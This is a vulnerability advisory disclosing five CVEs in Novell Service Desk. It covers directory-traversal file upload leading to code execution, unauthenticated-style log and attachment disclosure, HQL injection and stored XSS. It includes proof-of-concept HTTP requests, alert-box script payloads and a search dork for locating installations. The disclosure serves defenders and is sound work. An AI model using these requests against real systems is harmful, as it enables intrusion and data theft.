@@ -1,0 +1,172 @@
+>> Multiple vulnerabilities in Novell Service Desk 7.1.0, 7.0.3 and 6.5
+>> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security
+=================================================================================
+Disclosure: 30/03/2016 / Last updated: 10/04/2016
+
+>> Background on the affected products:
+"Novell Service Desk 7.1.0 is a complete service management solution that allows you to easily monitor and solve services issues so that there is minimal disruption to your organization, which allows users to focus on the core business. Novell Service Desk provides an online support system to meet the service requirements of all your customers, administrators, supervisors, and technicians"
+
+
+>> Summary:
+Novell Service Desk has several vulnerabilities including a file upload function that can be exploited to achieve authenticated remote code execution. The product appears to be a rebranded version of Absolute Service (another help desk system). The latter has not been tested but it is likely to contain the same vulnerabilities as Novell Service Desk. The Google dork for this application is inurl:"LiveTime/WebObjects". Version 7.2 and above now appear to be branded as "Micro Focus Service Desk". 
+Advisories for these vulnerabilities can be found in the Micro Focus site at [1], [2], [3] and [4].
+
+
+>> Technical details:
+#1 
+Vulnerability: Arbitrary file upload via directory traversal (leading to remote code execution)
+CVE-2016-1593
+Constraints: Administrator account needed
+Affected versions: 
+- NSD 7.1.0
+- NSD 7.0.3
+- NSD 6.5
+- Possibly earlier versions
+
+The User -> Customers -> Import function allows an administrator to upload files. The path specified in the filename parameter can be traversed using ../ characters and upload a JSP file to the Tomcat directory.
+
+The default path to be traversed is /LiveTime/Uploads/ on the Novell Service Desk Virtual Appliance Demo.
+
+POST /LiveTime/WebObjects/LiveTime.woa/wo/7.0.53.19.0.2.7.0.3.0.0.1 HTTP/1.1
+Content-Type: multipart/form-data; boundary=---------------------------2477470717121
+Content-Length: 533
+
+-----------------------------2477470717121
+Content-Disposition: form-data; name="0.53.19.0.2.7.0.3.0.0.1.1.1.4.0.0.23"; filename="../../srv/tomcat6/webapps/LiveTime/bla5.jsp"
+Content-Type: application/octet-stream
+
+<HTML>
+ <HEAD>
+  <TITLE>Hello World</TITLE>
+ </HEAD>
+ <BODY>
+  <H1>Hello World</H1>
+  Today is: <%= new java.util.Date().toString() %>
+ </BODY>
+</HTML>
+-----------------------------2477470717121
+Content-Disposition: form-data; name="ButtonUpload"
+
+Upload
+-----------------------------2477470717121--
+
+
+#2 
+Vulnerability: Information disclosure (Download System logs as any authenticated user - even unprivileged customers)
+CVE-2016-1594
+Constraints: User / client account needed
+Affected versions: 
+- NSD 7.0.3
+- NSD 6.5
+- Possibly earlier versions
+
+GET /LiveTime/WebObjects/LiveTime.woa/wa/DownloadAction/downloadLogFiles
+Contains the full error log, license and system information (operating system, java version, database, etc).
+
+
+#3
+Vulnerability: Information disclosure (Download any attachment from any client as an authenticated user - even unprivileged customers)
+CVE-2016-1594
+Constraints: User / client account needed
+Affected versions: 
+- NSD 7.1.0
+- NSD 7.0.3
+- NSD 6.5
+- Possibly earlier versions
+
+GET /LiveTime/WebObjects/LiveTime.woa/wa/DownloadAction/downloadFile?attachmentId=1&entityName=ItemTypeAttach
+
+Possible entityNames are:
+KbaAttachment
+ServiceAttachment
+IncidentAttachment
+ItemAttach
+ProjectAttachment
+GroupAttachment
+ContractAttachment
+ItemTypeAttach
+
+Cycling through all attachmentId numbers will yield all attachments for each entityName.
+
+
+#4
+Vulnerability: Hibernate Query Language (HQL) injection
+CVE-2016-1595
+Constraints: User / client account needed
+Affected versions: 
+- NSD 7.1.0
+- NSD 7.0.3
+- NSD 6.5
+- Possibly earlier versions
+
+GET /LiveTime/WebObjects/LiveTime.woa/wa/DownloadAction/downloadFile?attachmentId=1&entityName=<HQL injection here>
+
+Input is passed directly to Hibernate (line 125 of DownloadAction.class):
+        List<?> attachments = ((com.livetime.Session)session()).getDbSession().createQuery(new StringBuilder().append("from ").append(hasEn).append(" as attach where attach.attachmentId = ").append(hasId.intValue()).toString()).list();
+
+hasEn is entityName (string) and hasId is attachmentId (integer)
+
+
+#5
+Vulnerability: Stored Cross Site Scripting (XSS)
+CVE-2016-1596
+Constraints: User / client account needed
+Affected versions: 
+- NSD 7.1.0
+- NSD 7.0.3
+- NSD 6.5
+- Possibly earlier versions
+
+Several sections of the web application are vulnerable to stored cross site scripting. This includes the administrator portal (when logged in as an administrator, technician, manager or other administrative user), the end user portal (when logged in as a normal end user) and the forums. The vulnerabilities below are just examples as the vulnerability is present in many different pages.
+
+a)
+In the customer portal, clicking the user name will allow you to edit your display name.
+The fields tf_aClientFirstName and tf_aClientLastName are also vulnerable to stored XSS. Other fields might be vulnerable but have not been tested.
+Example:
+tf_aClientFirstName=Jos"><script>alert(1)</script>e&tf_aClientEmail=aa%40aa.bb&tf_aClientLastName="><script>alert(2)</script>Guestaa
+
+This can be used to attack an administrator or any other management user, as the name will be changed globally. If an administrator sees the list of users an alert box will pop up.
+
+b)
+In the Forums the content section is vulnerable when creating a new topic.
+The affected parameter is ta_selectedTopicContent.
+Example:
+tf_selectedTopicTitle=aaaaa&ta_selectedTopicContent="><script>alert(2)</script>&ButtonSave=Save
+
+The alert box will pop up when you view the topic.
+
+c)
+In User -> Organizational Units, the name parameter is vulnerable (tf_orgUnitName) when you are creating a new Organizational Unit.
+Example:
+POST /LiveTime/WebObjects/LiveTime.woa/wo/18.0.53.21.0.4.1.3.0.1 HTTP/1.1
+
+-----------------------------3162880314525
+Content-Disposition: form-data; name="tf_orgUnitName"
+
+"><script>alert(1)</script>
+
+The alert box will pop up when you view the Organizational Units page and possibly in other pages.
+
+d)
+In Configuration -> Vendors, the manufacturer name, address and city parameters are vulnerable when you are creating a new Vendor.
+Example:
+tf_aManufacturerFullName="><script>alert(1)</script>&tf_aManufacturerName="><script>alert(1)</script>&tf_aManufacturerAddress="><script>alert(1)</script>&tf_aManufacturerCity="><script>alert(1)</script>&tf_aManufacturerPostalCode=&pu_countryDGDisplayedObjects=WONoSelectionString&tf_aManufacturerPhone=&tf_aManufacturerFax=&tf_aManufacturerUrl=&ButtonSave=Save
+
+Three alert boxes will pop up when you view the Vendor page and possibly in other pages.
+
+
+>> Fix: 
+#1, #3, #4 and 5# - Upgrade to version 7.2.0
+#2 - Upgrade to version 7.1.0
+
+
+>> References:
+[1] https://www.novell.com/support/kb/doc.php?id=7017428
+[2] https://www.novell.com/support/kb/doc.php?id=7017429
+[3] https://www.novell.com/support/kb/doc.php?id=7017431
+[4] https://www.novell.com/support/kb/doc.php?id=7017430
+
+================
+Agile Information Security Limited
+http://www.agileinfosec.co.uk/
+>> Enabling secure digital business >>
